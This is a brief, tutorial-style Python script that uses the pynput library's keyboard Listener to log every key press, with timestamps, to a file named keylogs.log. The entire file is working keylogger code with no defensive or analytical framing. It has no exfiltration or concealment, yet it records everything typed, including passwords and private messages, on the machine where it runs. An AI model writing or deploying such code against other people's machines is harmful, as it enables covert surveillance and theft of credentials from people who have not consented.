#From keyboard subpackage in Pynput library, importing Listener class
#keyboard subpackage contains classes for controlling and accessing keyboard
from pynput.keyboard import Listener 
import logging

def on_press(key):
    logging.info(key)

#setting the configuration for the logging 
logging.basicConfig(format = '%(asctime)s:%(message)s', filename = "keylogs.log", encoding = 'utf-8', level = logging.INFO)

#Listener is a threading.Thread object and all the callbacks would be invoked from that thread
with Listener(on_press = on_press) as listener:
    #listener.start()
    listener.join()
    


